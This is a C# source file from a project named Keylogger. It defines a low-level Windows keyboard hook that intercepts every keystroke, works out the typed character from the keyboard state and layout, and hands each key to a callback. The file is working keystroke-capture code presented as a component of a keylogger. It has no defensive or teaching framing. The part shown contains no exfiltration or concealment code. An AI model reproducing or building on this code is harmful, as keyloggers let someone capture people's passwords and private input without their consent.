using System.Diagnostics;
using System.Runtime.InteropServices;
using static Keylogger.Interop.Win32Api;
using static Keylogger.Interop.Win32ApiHelper;

namespace Keylogger.Hooks
{
    internal static class KeyboardHook
    {
        public static Hookproc Hookproc => KeyboardHookCallback;

        public static Action<string, string>? CallBackMethod;
        public static Predicate<KeyboardMessage>? SelectedEventPredicate;
        private static readonly byte[] _keyboardState = new byte[256];

        private static IntPtr KeyboardHookCallback(int code, UIntPtr wParam, IntPtr lParam)
        {
            if (code < 0 || SelectedEventPredicate is null || !SelectedEventPredicate.Invoke((KeyboardMessage)wParam))
            {
                return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
            }

            var keyboardStruct = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
            var keyName = GetKeyName(keyboardStruct.vkCode);
            CallBackMethod?.Invoke(GetKeyboardMessageName(wParam), keyName);

            return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }

        private static string GetKeyName(uint vkCode)
        {
            if (!GetKeyboardState(_keyboardState))
            {
                Debug.WriteLine($"Error getting the keyboard state: {GetLastErrorMessage()}");
                return "Unknown key";
            }

            var scanCode = MapVirtualKeyW(vkCode, 0);
            var keyName = new char[16];
            var currentKeyboardLayout = GetKeyboardLayout(0);
            var result = ToUnicodeEx(vkCode, scanCode, _keyboardState, keyName, keyName.Length, 0, currentKeyboardLayout);

            // The specified virtual key is a dead key character (accent or diacritic).
            if (result < 0)
                return $"{new string(keyName, 0, -result)}";

            // The specified virtual key has no translation for the current state of the keyboard.
            if (result == 0 || result > 0 && IsNonPrintableKey(vkCode))
                return $"[{GetVirtualKeyName(vkCode)}]";

            return new string(keyName, 0, result);
        }
    }
}